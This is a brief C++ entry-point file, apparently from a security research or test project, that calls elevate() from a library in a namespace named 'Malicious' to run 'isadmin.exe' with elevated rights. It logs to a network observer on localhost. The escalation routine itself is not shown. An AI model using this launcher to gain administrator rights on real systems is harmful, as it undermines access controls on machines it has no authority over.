#include <common/Log.hpp>
using namespace Common;

#include <system/ThisProcess.hpp>
using namespace System;

#include <malicious/Elevator.hpp>
using namespace Malicious;

int main(int argc, char *argv[])
{
	try
	{
		LOG.setHeader("ELEVATOR");
		LOG.addObserver(new Common::LogToNetwork("127.0.0.1", 80));

		ThisProcess thisProcess;

		return elevate(thisProcess.getProgramDir()+"\\isadmin.exe");
    }
    catch(std::exception& e)
    {
        LOG << e.what();
    }
	catch(...)
	{
		LOG << "Unknown exception";
	}
	return EXIT_FAILURE;
}
